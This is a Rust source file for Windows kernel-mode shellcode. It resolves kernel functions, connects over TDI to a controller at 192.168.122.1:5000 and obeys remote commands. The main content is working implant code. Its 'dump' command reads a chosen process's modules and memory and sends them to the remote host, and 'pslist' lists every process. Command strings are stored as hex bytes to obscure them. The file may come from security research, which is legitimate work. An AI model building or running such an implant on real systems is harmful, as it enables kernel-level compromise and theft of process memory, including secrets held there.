#![no_std]
#![feature(asm)]
#![feature(core_intrinsics)]
use core::arch::asm;

#[repr(u32)]
enum ScrapeType {
    Module = 0,
    Memory = 1,
}

#[repr(C, packed)]
struct ScrapeInfo {
    scrape_type: ScrapeType,
    size: u32,
    address: u64,
}

#[no_mangle]
unsafe extern "stdcall"
fn _DllMainCRTStartup(
    _hinst_dll: *const u8,
    _fdw_reason: u32,
    _lpv_reserved: *const u8
) -> u64
{
    match shellcode_start() {
        Ok(_) => 0,
        Err(x) => x as _,
    }
}

unsafe fn shellcode_start() -> Result<(), ntdef::types::NTSTATUS> {
    // let nt_base = resolver::find_nt_base_address();
    let nt_base: ntdef::types::PVOID;
	asm!(
		"mov {0}, 0xfffff8024f205000",
		out(reg) nt_base
	);

    let ex_allocate_pool: ntdef::functions::ExAllocatePool = ntproc::find!("ExAllocatePool");

    let tdi_ctx: *mut nttdi::TdiContext = ex_allocate_pool(
        ntdef::enums::POOL_TYPE::NonPagedPool,
        core::mem::size_of::<nttdi::TdiContext>()
    ) as _;

    let mem_funcs: *mut ntmem::MemDumpFuncs = ex_allocate_pool(
        ntdef::enums::POOL_TYPE::NonPagedPool,
        core::mem::size_of::<ntmem::MemDumpFuncs>()
    ) as _;

    /*
    let fs_funcs: *mut ntfs::FsFuncs = ex_allocate_pool(
        ntdef::enums::POOL_TYPE::NonPagedPool,
        core::mem::size_of::<ntfs::FsFuncs>()
    ) as _;
    */

    (*tdi_ctx).funcs.ex_allocate_pool =                     ex_allocate_pool;
    (*tdi_ctx).funcs.ex_free_pool_with_tag =                ntproc::find!("ExFreePoolWithTag");
    (*tdi_ctx).funcs.io_allocate_mdl =                      ntproc::find!("IoAllocateMdl");
    (*tdi_ctx).funcs.io_build_device_io_control_request =   ntproc::find!("IoBuildDeviceIoControlRequest");
    (*tdi_ctx).funcs.io_get_related_device_object =         ntproc::find!("IoGetRelatedDeviceObject");
    (*tdi_ctx).funcs.iof_call_driver =                      ntproc::find!("IofCallDriver");
    (*tdi_ctx).funcs.ke_initialize_event =                  ntproc::find!("KeInitializeEvent");
    (*tdi_ctx).funcs.ke_wait_for_single_object =            ntproc::find!("KeWaitForSingleObject");
    (*tdi_ctx).funcs.ob_reference_object_by_handle =        ntproc::find!("ObReferenceObjectByHandle");
    (*tdi_ctx).funcs.zw_create_file =                       ntproc::find!("ZwCreateFile");
    (*tdi_ctx).funcs.mm_probe_and_lock_pages =              ntproc::find!("MmProbeAndLockPages");
    (*tdi_ctx).funcs.ke_raise_irql_to_dpc_level =           ntproc::find!("KeRaiseIrqlToDpcLevel");
    //(*tdi_ctx).funcs.ke_lower_irql =                        ntproc::find!("KeLowerIrql");

    (*mem_funcs).ke_stack_attach_process =                  ntproc::find!("KeStackAttachProcess");
    (*mem_funcs).ke_unstack_detach_process =                ntproc::find!("KeUnstackDetachProcess");
    (*mem_funcs).mm_secure_virtual_memory =                 ntproc::find!("MmSecureVirtualMemory");
    (*mem_funcs).mm_unsecure_virtual_memory =               ntproc::find!("MmUnsecureVirtualMemory");
    (*mem_funcs).obf_dereference_object =                   ntproc::find!("ObfDereferenceObject");
    (*mem_funcs).ps_get_process_image_file_name =           ntproc::find!("PsGetProcessImageFileName");
    (*mem_funcs).ps_lookup_process_by_process_id =          ntproc::find!("PsLookupProcessByProcessId");
    (*mem_funcs).zw_query_information_process =             ntproc::find!("ZwQueryInformationProcess");
    (*mem_funcs).zw_query_virtual_memory =                  ntproc::find!("ZwQueryVirtualMemory");

    /*
    (*fs_funcs).zw_create_file =                            (*tdi_ctx).funcs.zw_create_file;
    (*fs_funcs).zw_query_directory_file =                   ntproc::find!("ZwQueryDirectoryFile");
    (*fs_funcs).zw_close =                                  ntproc::find!("ZwClose");
    */

    let rtl_get_version: ntdef::functions::RtlGetVersion =  ntproc::find!("RtlGetVersion");
    let mut version: ntdef::structs::RTL_OSVERSIONINFOW = core::mem::MaybeUninit::uninit().assume_init();
    version.dwOSVersionInfoSize = core::mem::size_of_val(&version) as _;
    rtl_get_version(&mut version as *mut _ as _);

    (*tdi_ctx).msg_available = 0u32;
    (*tdi_ctx).app_buffer = ((*tdi_ctx).funcs.ex_allocate_pool)(ntdef::enums::POOL_TYPE::NonPagedPool, 1460 as _);

    use nttdi::Socket;
    let mut socket = nttdi::TdiSocket::new(tdi_ctx);
    socket.add_recv_handler(recv_handler);
    socket.connect(0x017aa8c0, 0x8813)?;  // 192.168.122.1:5000

    let hello = [0x68u8, 0x65u8, 0x6cu8, 0x6cu8, 0x6fu8, 0x0au8];
	let _ = socket.send(&hello as *const u8, 6 as _);

    let buf: ntdef::types::PVOID = ((*tdi_ctx).funcs.ex_allocate_pool)(
        ntdef::enums::POOL_TYPE::NonPagedPool, 1460 as _
    );

    /*
    let scratch_buf: ntdef::types::PVOID = ((*tdi_ctx).funcs.ex_allocate_pool)(
        ntdef::enums::POOL_TYPE::NonPagedPool, 3000 as _
    );
    */
    
    let mut buf_len: u32 = 0;
    let mut exec: u32 = 0 as _;

    let mut close: u8 = 0;
    while close == 0u8 {
        while (*tdi_ctx).msg_available == 0u32 {
            asm!("nop");
        }

        if (*tdi_ctx).msg_available == 1u32 {
            buf_len = (*tdi_ctx).buf_len as _;
            ntdef::macros::RtlCopyMemory(buf as _, (*tdi_ctx).app_buffer as _, buf_len as _);
            exec = 1 as _;
            (*tdi_ctx).msg_available = 0u32;
        }

        if exec == 1u32 {
            let echo_cmd = [0x65u8, 0x63u8, 0x68u8, 0x6fu8, 0x20u8];
            let close_cmd = [0x63u8, 0x6cu8, 0x6fu8, 0x73u8, 0x65u8, 0x0au8];
            let version_cmd = [0x76u8, 0x65u8, 0x72u8, 0x73u8, 0x69u8, 0x6fu8, 0x6eu8, 0x0au8];
            let dump_cmd = [0x64u8, 0x75u8, 0x6du8, 0x70u8, 0x20u8];
            let pslist_cmd = [0x70u8, 0x73u8, 0x6cu8, 0x69u8, 0x73u8, 0x74u8, 0x0au8];
            let dir_cmd = [0x64u8, 0x69u8, 0x72u8, 0x20u8];
            if ntdef::macros::RtlEqualMemory(buf as _, &echo_cmd as _, 5) == 1u32 {
                let _ = socket.send((buf as *const u8).offset(5) as *const u8, buf_len - 5);
            } else if ntdef::macros::RtlEqualMemory(buf as _, &close_cmd as _, 6) == 1u32 {
                _ = socket.close();
                close = 1 as _;
            } else if ntdef::macros::RtlEqualMemory(buf as _, &version_cmd as _, 8) == 1u32 {
                let _ = socket.send(&version as *const _ as _, core::mem::size_of_val(&version) as _);
            } else if ntdef::macros::RtlEqualMemory(buf as _, &dump_cmd as _, 5) == 1u32 {
                let proc_name_hash = resolver::hash::fnv1a_32_hash((buf as *const u8).offset(5) as _, true, false);
                let mut proc_found: u32 = 1 as _;
                let mut memdump = match ntmem::MemoryDumper::new(mem_funcs, proc_name_hash as _) {
                    Ok(x) => x,
                    Err(_) => {
                        proc_found = 0 as _;
                        core::mem::MaybeUninit::uninit().assume_init()
                    }
                };
                if proc_found == 1 as _ {
                    let proc_found_msg = [0x70u8, 0x72u8, 0x6fu8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x20u8, 0x66u8, 0x6fu8, 0x75u8, 0x6eu8, 0x64u8, 0x2cu8, 0x20u8, 0x64u8, 0x75u8, 0x6du8, 0x70u8, 0x20u8, 0x73u8, 0x74u8, 0x61u8, 0x72u8, 0x74u8, 0x73u8, 0x0au8];
                    let _ = socket.send(&proc_found_msg as *const u8, 27 as _);
                    let mut i: isize = 0;
                    let memdump_max_iterations: isize = 100;
                    let mut go_on: u32 = 1;
                    while go_on == 1 as _ {
                        if i >= memdump_max_iterations {
                            go_on = 0 as _;
                        } else {
                            let (address, size, nameptr) = match memdump.next_module() {
                                Ok(x) => x,
                                Err(_) => {
                                    go_on = 0 as _;
                                    core::mem::MaybeUninit::uninit().assume_init()
                                }
                            };
                    
                            let region_info = ScrapeInfo { scrape_type: ScrapeType::Module, address: address as _, size: size as _ };
                            let _ = socket.send(&region_info as *const _ as _, core::mem::size_of_val(&region_info) as _);
                            let _ = socket.send(nameptr as _, 100);
                            i = i + 1;
                        }
                    }
                    i = 0;
                    go_on = 1;
                    while go_on == 1 as _ {
                        if i >= memdump_max_iterations {
                            go_on = 0 as _;
                        } else {
                            let (address, size) = match memdump.next_range() {
                                Ok(x) => x,
                                Err(_) => {
                                    go_on = 0 as _;
                                    core::mem::MaybeUninit::uninit().assume_init()
                                }
                            };
                    
                            let region_info = ScrapeInfo { scrape_type: ScrapeType::Memory, address: address as _, size: size as _ };
                            let _ = socket.send(&region_info as *const _ as _, core::mem::size_of_val(&region_info) as _);
                            let _ = socket.send(address as _, size as _);

                            i = i + 1;
                        }
                    }
                    let dump_finished_msg = [0x0au8, 0x64u8, 0x75u8, 0x6du8, 0x70u8, 0x20u8, 0x66u8, 0x69u8, 0x6eu8, 0x69u8, 0x73u8, 0x68u8, 0x65u8, 0x64u8, 0x0au8];
                    let _ = socket.send(&dump_finished_msg as *const u8, 15 as _);
                    // destructor is called implicitly
                    // memdump.drop();
                } else {
                    let proc_not_found_msg = [0x70u8, 0x72u8, 0x6fu8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x20u8, 0x6eu8, 0x6fu8, 0x74u8, 0x20u8, 0x66u8, 0x6fu8, 0x75u8, 0x6eu8, 0x64u8, 0x0au8];
                    let _ = socket.send(&proc_not_found_msg as *const u8, 18 as _);
                }
            } else if ntdef::macros::RtlEqualMemory(buf as _, &pslist_cmd as _, 7) == 1u32 {
                let pslist_start_msg = [0x70u8, 0x72u8, 0x6fu8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x20u8, 0x6cu8, 0x69u8, 0x73u8, 0x74u8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x73u8, 0x74u8, 0x61u8, 0x72u8, 0x74u8, 0x0au8];
                let _ = socket.send(&pslist_start_msg as *const u8, 22 as _);
                let mut pid: u32 = 0x0;
                while pid < 0xffff as _ {
                    pid += 4;
    
                    let mut process: ntdef::structs::PEPROCESS = core::ptr::null_mut();
                    let status = ((*mem_funcs).ps_lookup_process_by_process_id)(pid as _, &mut process as _);
    
                    if !ntdef::macros::NT_SUCCESS(status) {
                        continue;
                    }
                    
                    let proc_name = ((*mem_funcs).ps_get_process_image_file_name)(process);
                    let name_len = ntdef::macros::Strlen(proc_name as _);
                    ntdef::macros::RtlCopyMemory(buf as _, proc_name as _, name_len as _);
                    ((*mem_funcs).obf_dereference_object)(process);
                    *(buf as *mut u8).offset(name_len as _) = 0x0au8; // add newline
                    let _ = socket.send(buf as *const u8, (name_len+1) as _);
                }
                let pslist_end_msg = [0x70u8, 0x72u8, 0x6fu8, 0x63u8, 0x65u8, 0x73u8, 0x73u8, 0x20u8, 0x6cu8, 0x69u8, 0x73u8, 0x74u8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x65u8, 0x6eu8, 0x64u8, 0x0au8];
                let _ = socket.send(&pslist_end_msg as *const u8, 20 as _);
            } else if ntdef::macros::RtlEqualMemory(buf as _, &dir_cmd as _, 4) == 1u32 {
                let not_implemented_msg = [0x6eu8, 0x6fu8, 0x74u8, 0x20u8, 0x69u8, 0x6du8, 0x70u8, 0x6cu8, 0x65u8, 0x6du8, 0x65u8, 0x6eu8, 0x74u8, 0x65u8, 0x64u8, 0x0au8];
                let _ = socket.send(&not_implemented_msg as *const u8, 16);
                /*
                *(buf as *mut u8).offset((buf_len-1) as _) = 0x00u8; // null terminate instead of newline
                let mut dir_open_error: u32 = 0;
                let mut handle: ntdef::types::HANDLE = scratch_buf as _;
                let _ = match ntfs::open_directory(
                    fs_funcs, (buf as *const u8).offset(4) as _, &mut handle as _) {
                        0 => 0,
                        _ => {
                            dir_open_error = 1 as _;
                            1
                        }
                    };
                if dir_open_error == 0 as _ {
                    // HERE: error in this branch, after query_directory
                    let dir_send_start_msg = [0x64u8, 0x69u8, 0x72u8, 0x65u8, 0x63u8, 0x74u8, 0x6fu8, 0x72u8, 0x79u8, 0x20u8, 0x6fu8, 0x70u8, 0x65u8, 0x6eu8, 0x65u8, 0x64u8, 0x2cu8, 0x20u8, 0x73u8, 0x65u8, 0x6eu8, 0x64u8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x66u8, 0x69u8, 0x6cu8, 0x65u8, 0x73u8, 0x0au8];
                    let _ = socket.send(&dir_send_start_msg as *const u8, 32 as _);
                    let mut file_names_information = buf as ntdef::structs::PFILE_NAMES_INFORMATION;
                    let _ = ntfs::query_directory(fs_funcs, handle, file_names_information as _);
                    while (*file_names_information).NextEntryOffset != 0 {
                        // note: FileName is wide character array
                        let file_name: *const u16 = &((*file_names_information).FileName) as _;
                        let file_name_length = ((*file_names_information).FileNameLength) * 2;
                        let _ = socket.send(file_name as _, file_name_length as _);
                        file_names_information = (file_names_information as *mut u8).offset(
                            (*file_names_information).NextEntryOffset as _
                        ) as ntdef::structs::PFILE_NAMES_INFORMATION;
                    }
                    let dir_listing_finished_msg = [0x64u8, 0x69u8, 0x72u8, 0x65u8, 0x63u8, 0x74u8, 0x6fu8, 0x72u8, 0x79u8, 0x20u8, 0x6cu8, 0x69u8, 0x73u8, 0x74u8, 0x69u8, 0x6eu8, 0x67u8, 0x20u8, 0x66u8, 0x69u8, 0x6eu8, 0x69u8, 0x73u8, 0x68u8, 0x65u8, 0x64u8, 0x0au8];
                    let _ = socket.send(&dir_listing_finished_msg as *const u8, 27 as _);
                    ntfs::close_handle(fs_funcs, handle);
                } else {
                    let dir_open_error_msg = [0x65u8, 0x72u8, 0x72u8, 0x6fu8, 0x72u8, 0x20u8, 0x77u8, 0x69u8, 0x74u8, 0x68u8, 0x20u8, 0x73u8, 0x70u8, 0x65u8, 0x63u8, 0x69u8, 0x66u8, 0x69u8, 0x65u8, 0x64u8, 0x20u8, 0x64u8, 0x69u8, 0x72u8, 0x65u8, 0x63u8, 0x74u8, 0x6fu8, 0x72u8, 0x79u8, 0x0au8];
                    let _ = socket.send(&dir_open_error_msg as *const u8, 31);
                }
                */
            } else {
                let invalid_cmd = [0x69u8, 0x6eu8, 0x76u8, 0x61u8, 0x6cu8, 0x69u8, 0x64u8, 0x20u8, 0x63u8, 0x6fu8, 0x6du8, 0x6du8, 0x61u8, 0x6eu8, 0x64u8, 0x0au8];
                let _ = socket.send(&invalid_cmd as *const u8, 16 as _);
            }
            exec = 0 as _;
        }
    }
    (*tdi_ctx).msg_available = 1u32;    // to inhibit recv_handler
    // Doing these de-allocations causes bug check in the cleaning-up module
    /*
    ((*tdi_ctx).funcs.ex_free_pool_with_tag)(buf, 1);
    ((*tdi_ctx).funcs.ex_free_pool_with_tag)((*tdi_ctx).app_buffer as _, 2);
    // ((*tdi_ctx).funcs.ex_free_pool_with_tag)(scratch_buf, 3);
    */
    // this is to avoid errors if returning to a cleaning-up module
    _ = ((*tdi_ctx).funcs.ke_raise_irql_to_dpc_level)();
    Ok(())
}

// called at DISPATCH_LEVEL
unsafe fn recv_handler(
    _tdi_event_context:      ntdef::types::PVOID,
    _connection_context:     ntdef::types::PVOID,
    _receive_flags:          ntdef::types::ULONG,
    _bytes_indicated:        ntdef::types::ULONG,
    bytes_available:        ntdef::types::ULONG,
    bytes_taken:            *mut ntdef::types::ULONG,
    _buffer:                 ntdef::types::PVOID,
    irp:                    *mut ntdef::structs::PIRP,
) -> ntdef::types::NTSTATUS {
    //core::intrinsics::breakpoint();

    *bytes_taken = bytes_available;
    *irp = core::ptr::null_mut();

    let tdi_ctx: *mut nttdi::TdiContext = _tdi_event_context as _;

    if (*tdi_ctx).msg_available == 0u32 {
        ntdef::macros::RtlCopyMemory((*tdi_ctx).app_buffer as _, _buffer as _, _bytes_indicated as _);
        (*tdi_ctx).buf_len = _bytes_indicated;
        (*tdi_ctx).msg_available = 1u32;
    }

    ntdef::enums::NTSTATUS::STATUS_SUCCESS as _
}

/*
unsafe fn acquire_spinlock(sync: *mut u32) {
    let _key: u32;
    asm!(
        "3:",
        "mov {0:e}, 1",
        "xchg {0:e}, DWORD PTR[{1}]",
        "test {0:e}, {0:e}",    
        "jnz 3b",
        out(reg) _key,
        in(reg) sync
    );
}
*/

#[panic_handler]
fn panic(_info: &core::panic::PanicInfo) -> ! {
    loop {
    }
}
